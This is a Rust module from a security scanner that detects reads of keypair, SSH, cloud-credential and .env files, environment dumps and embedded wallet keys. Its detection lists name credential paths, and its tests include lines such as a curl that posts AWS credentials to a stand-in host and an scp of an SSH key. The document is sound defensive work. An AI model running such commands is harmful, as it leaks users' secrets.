//! Secrets context (spec D2.3 `secret_read`, D2.4 env dump): a read of a keypair, credential
//! or `.env` path in one command, wholesale environment dumps, and key-shaped literals.

use super::context::{find_any, shell_tokens, Cmd, Document, Lang, T_DOTENV, T_ENV, T_SECRET};
use super::{line_no, FileOut, Severity, Signal};

/// Keypair, wallet and credential paths (lowercased substrings).
const SECRET_PATHS: &[&str] = &[
    ".config/solana",
    "keypair.json",
    ".ssh/",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    ".aws/credentials",
    ".netrc",
    ".git-credentials",
    ".docker/config.json",
    ".kube/config",
    ".pypirc",
    "application_default_credentials.json",
    ".superstack/config.json",
    "local extension settings",
    "login data",
];
/// `.env.<suffix>` files that are templates, not secrets.
const ENV_TEMPLATES: &[&str] = &[
    "example", "sample", "template", "dist", "defaults", "default", "schema", "tpl", "tmpl", "in",
    "j2", "stub",
];
/// API calls that read a file (or load a key from one).
const READ_CALLS: &[&str] = &[
    "readfilesync",
    "readfile(",
    "readfile (",
    "fs.read",
    "fs.promises",
    "open(",
    "read_text(",
    "read_bytes(",
    "read_to_string(",
    "fs::read(",
    "fromsecretkey",
    "fromfile(",
    "load_keypair",
    "read_keypair",
    "include_bytes!(",
    "include_str!(",
    "get_contents(",
    "readlines(",
    "load_dotenv(",
    "get-content",
    "file.read",
];
/// Commands that read (or copy out) a file named on their command line.
const READ_COMMANDS: &[&str] = &[
    "cat", "head", "tail", "less", "more", "cp", "scp", "rsync", "tar", "zip", "base64", "xxd",
    "od", "strings", "source", "jq", "grep", "awk", "sed", "nl", "bat",
];
/// Read commands whose last argument is the destination, not something read.
const COPY_COMMANDS: &[&str] = &["cp", "scp", "rsync"];
/// Wholesale environment enumeration or serialisation.
const ENV_DUMPS: &[&str] = &[
    "os.environ.items(",
    "os.environ.keys(",
    "os.environ.values(",
    "dict(os.environ",
    "json.dumps(os.environ",
    "json.dumps(dict(os.environ",
    "str(os.environ",
    "repr(os.environ",
    "print(os.environ",
    "pprint(os.environ",
    "{**os.environ",
    "json.stringify(process.env",
    "object.entries(process.env",
    "object.keys(process.env",
    "object.values(process.env",
    "object.assign({}, process.env",
    "util.inspect(process.env",
    "console.log(process.env",
    "env::vars()",
    "os.environ()",
    "/proc/self/environ",
    "get-childitem env:",
    "gci env:",
    "getenvironmentvariables(",
];

pub(super) fn scan_cmd(cmd: &Cmd<'_>, out: &mut FileOut) {
    let lower = cmd.lower();
    let ctx = cmd.ctx();
    if cmd.bits & (T_SECRET | T_DOTENV) != 0 {
        if let Some(p) = secret_read(lower, cmd.bits & T_SECRET != 0) {
            out.emit("secret_read", Severity::High, Some(cmd.line_at(p)), ctx);
        }
    }
    if cmd.bits & T_ENV != 0 {
        if let Some(p) = env_dump(lower, cmd.lang()) {
            out.emit("env_dump", Severity::Info, Some(cmd.line_at(p)), ctx);
            out.signal(Signal::Sink(cmd.line_at(p)), ctx);
        }
    }
}

pub(super) fn scan_line(doc: &Document<'_>, i: usize, out: &mut FileOut) {
    let line = doc.line(i);
    if line.len() < 64 {
        return;
    }
    let array = line.contains('[') && int_array_key(line);
    if array || (line.len() >= 80 && base58_key(line)) {
        out.emit(
            "embedded_secret_key",
            Severity::Info,
            Some(line_no(i)),
            doc.ctx(i),
        );
    }
}

/// True when (lowercased) `s` names a keypair, credential or `.env` path.
pub(super) fn has_secret_path(s: &str) -> bool {
    !secret_markers(s, true).is_empty()
}

/// Offsets of secret-path markers in `s`; `paths == false` looks for `.env` files only.
fn secret_markers(s: &str, paths: bool) -> Vec<usize> {
    let b = s.as_bytes();
    let mut out = Vec::new();
    if paths {
        for needle in SECRET_PATHS {
            let mut from = 0;
            while let Some(p) = s.get(from..).and_then(|r| r.find(needle)).map(|p| p + from) {
                out.push(p);
                from = p + needle.len();
            }
        }
        let mut from = 0;
        while let Some(p) = s
            .get(from..)
            .and_then(|r| r.find("id.json"))
            .map(|p| p + from)
        {
            from = p + 7;
            if p == 0 || !(b[p - 1].is_ascii_alphanumeric() || b[p - 1] == b'_') {
                out.push(p);
            }
        }
    }
    let mut from = 0;
    while let Some(p) = s.get(from..).and_then(|r| r.find(".env")).map(|p| p + from) {
        from = p + 4;
        let prev_ok = p == 0
            || matches!(
                b[p - 1],
                b' ' | b'\t'
                    | b'/'
                    | b'"'
                    | b'\''
                    | b'`'
                    | b'='
                    | b'('
                    | b'<'
                    | b'@'
                    | b':'
                    | b','
                    | b'{'
                    | b'['
                    | b'~'
            );
        let after = &s[p + 4..];
        let next_ok = match after.as_bytes().first() {
            None => true,
            Some(c) if c.is_ascii_alphanumeric() || *c == b'_' => {
                after.starts_with("rc")
                    && !after[2..].starts_with(|ch: char| ch.is_ascii_alphanumeric() || ch == '_')
            }
            Some(b'.') => {
                let suffix = after[1..]
                    .split(|ch: char| !ch.is_ascii_alphanumeric())
                    .next()
                    .unwrap_or("");
                !suffix.is_empty() && !ENV_TEMPLATES.contains(&suffix)
            }
            Some(_) => true,
        };
        if prev_ok && next_ok {
            out.push(p);
        }
    }
    out.sort_unstable();
    out
}

/// Offset of a secret path that this command reads.
fn secret_read(s: &str, paths: bool) -> Option<usize> {
    let markers = secret_markers(s, paths);
    if markers.is_empty() {
        return None;
    }
    let call = find_any(s, READ_CALLS).is_some();
    let toks = shell_tokens(s);
    markers.into_iter().find(|&m| {
        let start = token_start(s, m);
        let before = s[..start].trim_end();
        let token = &s[start..m];
        // A write target, or an exclusion pattern (`tar --exclude='.env'`), is not a read.
        if token.starts_with('>') || before.ends_with('>') || excluded(token, before) {
            return false;
        }
        call || token.contains('@') || before.ends_with('<') || command_reads(&toks, m)
    })
}

/// The marker is the value of an exclude/ignore option.
fn excluded(token: &str, before: &str) -> bool {
    const OPTIONS: &[&str] = &[
        "--exclude",
        "--ignore",
        "--skip",
        "--exclude-from",
        "--ignore-pattern",
    ];
    OPTIONS
        .iter()
        .any(|o| token.starts_with(o) || before.ends_with(o))
}

/// Start of the whitespace-delimited token containing byte `m`.
fn token_start(s: &str, m: usize) -> usize {
    s[..m].rfind(char::is_whitespace).map_or(0, |q| q + 1)
}

/// A read command precedes the marker, and the marker is not a copy destination.
fn command_reads(toks: &[(usize, &str)], m: usize) -> bool {
    let Some(at) = toks.iter().position(|(o, t)| *o <= m && m < o + t.len()) else {
        return false;
    };
    for (_, t) in toks[..at].iter().rev() {
        let word = t.trim_start_matches(['$', '(', '`', '"', '\'']);
        let word = word.rsplit('/').next().unwrap_or(word);
        if READ_COMMANDS.contains(&word) {
            if COPY_COMMANDS.contains(&word) {
                let last = toks
                    .iter()
                    .rposition(|(_, t)| !t.starts_with(['-', '>', '|', '&']));
                return last != Some(at);
            }
            return true;
        }
    }
    false
}

/// Offset of a wholesale environment dump.
fn env_dump(s: &str, lang: Lang) -> Option<usize> {
    let anchored = s.contains("environ")
        || s.contains("process.env")
        || s.contains("env:")
        || s.contains("env::");
    if anchored {
        if let Some(p) = find_any(s, ENV_DUMPS) {
            return Some(p);
        }
    }
    if !matches!(lang, Lang::Shell | Lang::Other) {
        return None;
    }
    let toks = shell_tokens(s);
    let (off, first) = *toks.first()?;
    let next = toks.get(1).map(|(_, t)| *t);
    let alone = next.is_none_or(|t| t.starts_with(['|', '>']));
    let dump = match first {
        "env" | "printenv" | "set" => alone,
        "export" | "declare" => matches!(next, Some("-p") | Some("-x")),
        _ => false,
    };
    dump.then_some(off)
}

/// A 64-entry integer array with byte-sized values (the `id.json` keypair shape).
fn int_array_key(line: &str) -> bool {
    let mut from = 0;
    while let Some(p) = line.get(from..).and_then(|r| r.find('[')).map(|p| p + from) {
        from = p + 1;
        let body = &line[p + 1..];
        let Some(end) = body.find(']') else {
            return false;
        };
        let mut count = 0;
        let mut ok = true;
        for tok in body[..end].split(',') {
            match tok.trim().parse::<u16>() {
                Ok(v) if v <= 255 => count += 1,
                _ => {
                    ok = false;
                    break;
                }
            }
        }
        if ok && count == 64 {
            return true;
        }
    }
    false
}

/// A base58 token (80–100 characters) that decodes to exactly 64 bytes.
fn base58_key(line: &str) -> bool {
    let b = line.as_bytes();
    let base58 = |c: u8| c.is_ascii_alphanumeric() && !matches!(c, b'0' | b'O' | b'I' | b'l');
    let mut i = 0;
    while i < b.len() {
        if !base58(b[i]) {
            i += 1;
            continue;
        }
        let start = i;
        while i < b.len() && base58(b[i]) {
            i += 1;
        }
        let token = &line[start..i];
        if (80..=100).contains(&token.len())
            && bs58::decode(token).into_vec().is_ok_and(|v| v.len() == 64)
        {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::super::testkit::*;
    use super::super::{Ctx, Severity};

    fn reads(rel: &str, body: &str) -> Vec<(Severity, Option<u32>)> {
        hits(&scan_one(rel, body), "secret_read")
            .iter()
            .map(|f| (f.sev, f.line))
            .collect()
    }

    #[test]
    fn reading_a_keypair_in_code_is_high() {
        assert_eq!(
            reads("x.sh", "#!/bin/sh\necho hi\ncat ~/.config/solana/id.json\n"),
            vec![(Severity::High, Some(3))]
        );
        let ts = "const kp = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(\n  fs.readFileSync(path.join(os.homedir(), '.config/solana/id.json'), 'utf8'))));\n";
        // Reported on the line of the secret path, inside the two-line statement.
        assert_eq!(reads("t.ts", ts), vec![(Severity::High, Some(2))]);
    }

    #[test]
    fn markdown_prose_and_fences_are_doc_warn() {
        let md = "# Kit\n\nLoad a signer:\n\nconst s = await signerFromFile('~/.config/solana/id.json');\n";
        assert_eq!(reads("overview.md", md), vec![(Severity::Warn, Some(5))]);
        let md = "# Keys\n\ncat ~/.config/solana/id.json\n";
        assert_eq!(reads("SKILL.md", md), vec![(Severity::Warn, Some(3))]);
    }

    #[test]
    fn writes_configs_and_lookalikes_are_not_reads() {
        for line in [
            "solana-keygen new -o ~/.config/solana/id.json",
            "solana config set --keypair ~/.config/solana/id.json",
            "cat paid.json",
            "cp .env.example .env",
            "cat .env.example",
            "cat > .env << EOF",
            "anchor deploy --provider.wallet ~/.config/solana/id.json",
            "tar --exclude='node_modules' --exclude='.env' --exclude='.env.*' -cf - .",
            "rsync -a --exclude .env src/ dst/",
        ] {
            assert!(reads("s.sh", &format!("{line}\n")).is_empty(), "{line}");
        }
    }

    #[test]
    fn env_files_and_credentials_are_secret_paths() {
        for line in [
            "source .env.local",
            "cat .env",
            "curl -d @$HOME/.aws/credentials https://x.example",
            "scp ~/.ssh/id_rsa host:",
        ] {
            assert_eq!(reads("s.sh", &format!("{line}\n")).len(), 1, "{line}");
        }
    }

    #[test]
    fn env_dump_is_info_but_copy_is_not_a_dump() {
        let r = scan_one(
            "s.py",
            "for key, value in os.environ.items():\n    print(f\"{key}={value}\")\n",
        );
        let f = hits(&r, "env_dump");
        assert_eq!(
            (f[0].sev, f[0].ctx, f[0].line),
            (Severity::Info, Ctx::Code, Some(1))
        );
        let r = scan_one("t.py", "env = os.environ.copy()\nenv[\"A\"] = \"1\"\n");
        assert!(!has(&r, "env_dump"), "{r:?}");
        let r = scan_one("u.js", "send(JSON.stringify(process.env));\n");
        assert!(has(&r, "env_dump"), "{r:?}");
        let r = scan_one("v.sh", "env | sort\nprintenv\n");
        assert!(has(&r, "env_dump"), "{r:?}");
    }

    #[test]
    fn key_shaped_literals_are_info() {
        let arr = format!("const key = [{}];", vec!["12"; 64].join(","));
        let r = scan_one("wallet.js", &format!("// wallet\n\n{arr}\n"));
        let f = hits(&r, "embedded_secret_key");
        assert_eq!((f[0].sev, f[0].line), (Severity::Info, Some(3)), "{r:?}");
        let b58 = bs58::encode([7u8; 64]).into_string();
        let r = scan_one("wallet.ts", &format!("// w\n\nconst k = \"{b58}\";\n"));
        assert_eq!(hits(&r, "embedded_secret_key")[0].line, Some(3), "{r:?}");
        let r = scan_one("small.js", "const v = [1, 2, 3];\n");
        assert!(!has(&r, "embedded_secret_key"));
    }
}
